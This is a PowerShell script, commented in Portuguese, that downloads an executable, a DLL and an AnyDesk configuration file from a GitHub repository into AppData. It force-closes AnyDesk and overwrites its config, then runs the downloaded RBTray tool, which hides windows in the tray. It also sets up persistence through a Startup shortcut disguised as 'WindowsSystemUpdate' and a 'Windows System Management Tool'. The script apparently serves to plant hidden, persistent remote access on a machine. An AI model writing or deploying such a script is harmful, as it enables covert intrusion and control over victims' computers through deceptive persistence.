# 1. Definições
$myFolder = "$env:AppData\Questions"
$anydeskUserDir = "$env:AppData\AnyDesk"
$startupPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Criar a pasta de trabalho
if (!(Test-Path $myFolder)) { New-Item -ItemType Directory -Path $myFolder | Out-Null }

# 3. Baixar os ficheiros
$urls = @{
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBTray.exe" = "$myFolder\RBTray.exe"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBHook.dll" = "$myFolder\RBHook.dll"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/system.conf" = "$myFolder\system.conf"
}

foreach ($url in $urls.Keys) {
    Invoke-WebRequest -Uri $url -OutFile $urls[$url]
}

# 4. Configurar o AnyDesk (Sem ser serviço, apenas copia o ficheiro)
if (Test-Path $anydeskUserDir) {
    # Mata qualquer instância aberta para atualizar o config sem conflitos
    Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
    
    # Copia o teu config para a pasta do utilizador (onde ele lê a config)
    Copy-Item -Path "$myFolder\system.conf" -Destination "$anydeskUserDir\system.conf" -Force
}

# 5. Criar o atalho no Startup para o RBTray
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystemUpdate.lnk")
$shortcut.TargetPath = "$myFolder\RBTray.exe"
$shortcut.WorkingDirectory = $myFolder
$shortcut.Description = "Windows System Management Tool"
$shortcut.Save()

# 6. Executar o RBTray
Start-Process "$myFolder\RBTray.exe"

Write-Host "Deploy completo, Questions! Tudo pronto." -ForegroundColor Green
